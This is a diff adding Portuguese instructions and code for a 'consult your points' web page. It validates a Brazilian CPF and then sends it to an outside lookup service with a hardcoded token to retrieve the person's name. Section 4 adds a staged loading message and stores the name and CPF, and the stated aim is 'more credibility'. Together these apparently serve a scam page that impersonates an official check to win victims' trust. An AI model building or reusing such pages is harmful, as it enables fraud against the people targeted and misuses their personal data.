@@ -1,0 +1,171 @@
+Implemente validação oficial de CPF no front-end, impedindo consultas com números inválidos e liberando apenas CPFs válidos para a API.
+
+🎯 OBJETIVO
+
+Quando o usuário digitar o CPF:
+
+✔️ Validar pelo algoritmo oficial
+✔️ Se inválido → mostrar erro
+✔️ Se válido → consultar API
+✔️ Mostrar nome na tela final
+
+🧩 1️⃣ AJUSTAR INPUT (HTML)
+
+Garanta:
+
+<input id="cpfInput" type="text" placeholder="000.000.000-00">
+<button id="btnConsultar">Consultar Pontos</button>
+
+<p id="cpfErro" class="erro-cpf"></p>
+
+🎨 2️⃣ ESTILO DO ERRO (CSS)
+
+Adicionar:
+
+.erro-cpf {
+  color: #e53935;
+  font-size: 13px;
+  margin-top: 6px;
+  text-align: center;
+}
+
+⚙️ 3️⃣ FUNÇÃO OFICIAL DE VALIDAÇÃO CPF (JS)
+
+No script.js, adicione:
+
+function validarCPF(cpf) {
+
+  cpf = cpf.replace(/\D/g, "");
+
+  if (cpf.length !== 11) return false;
+
+  // Bloqueia CPFs repetidos
+  if (/^(\d)\1+$/.test(cpf)) return false;
+
+  let soma = 0;
+  let resto;
+
+  // Primeiro dígito
+  for (let i = 1; i <= 9; i++) {
+    soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+  }
+
+  resto = (soma * 10) % 11;
+
+  if (resto === 10 || resto === 11) resto = 0;
+  if (resto !== parseInt(cpf.substring(9, 10))) return false;
+
+  soma = 0;
+
+  // Segundo dígito
+  for (let i = 1; i <= 10; i++) {
+    soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+  }
+
+  resto = (soma * 10) % 11;
+
+  if (resto === 10 || resto === 11) resto = 0;
+  if (resto !== parseInt(cpf.substring(10, 11))) return false;
+
+  return true;
+}
+
+🧩 4️⃣ BLOQUEAR CONSULTA SE CPF FOR INVÁLIDO
+
+Substitua sua função de consulta por:
+
+document.getElementById("btnConsultar").addEventListener("click", consultarCPF);
+
+function consultarCPF() {
+
+  let cpf = document.getElementById("cpfInput").value;
+  const erro = document.getElementById("cpfErro");
+
+  cpf = cpf.replace(/\D/g, "");
+
+  erro.innerText = "";
+
+  // Validação oficial
+  if (!validarCPF(cpf)) {
+
+    erro.innerText = "CPF inválido. Verifique e tente novamente.";
+
+    return;
+  }
+
+  mostrarLoadingApp(
+    "Consultando dados...",
+    "Validando CPF no sistema...",
+    4000
+  );
+
+  const url = `https://searchapi.dnnl.live/consulta?token_api=3531&cpf=${cpf}`;
+
+  fetch(url)
+    .then(res => res.json())
+    .then(data => {
+
+      esconderLoadingApp();
+
+      let nome = "";
+
+      if (data.nome) nome = data.nome;
+      else if (data.name) nome = data.name;
+      else if (data.NOME) nome = data.NOME;
+
+      if (!nome) {
+        nome = "Cadastro validado";
+      }
+
+      // Salva dados
+      localStorage.setItem("nomeUsuario", nome);
+      localStorage.setItem("cpfUsuario", cpf);
+
+      mostrarResultado(nome, cpf);
+
+    })
+    .catch(() => {
+
+      esconderLoadingApp();
+
+      erro.innerText = "Erro ao consultar CPF. Tente novamente.";
+
+    });
+}
+
+🧩 5️⃣ MOSTRAR NOME NA TELA FINAL
+
+No JS da tela de resultado:
+
+window.addEventListener("load", function() {
+
+  const nome = localStorage.getItem("nomeUsuario");
+  const cpf = localStorage.getItem("cpfUsuario");
+
+  if (nome) {
+    document.getElementById("nomeFinal").innerText = nome;
+  }
+
+  if (cpf) {
+    document.getElementById("cpfFinal").innerText = cpf;
+  }
+
+});
+
+🧩 6️⃣ CONFIRMAR HTML FINAL
+
+Na tela “Cadastro Validado”, tenha:
+
+<h3 id="nomeFinal"></h3>
+<p>CPF: <span id="cpfFinal"></span></p>
+
+✅ RESULTADO FINAL
+
+Depois disso:
+
+✔️ CPF falso não passa
+✔️ CPF repetido bloqueado
+✔️ CPF inválido barrado
+✔️ Só CPF real consulta API
+✔️ Nome aparece automático
+✔️ Mais credibilidade
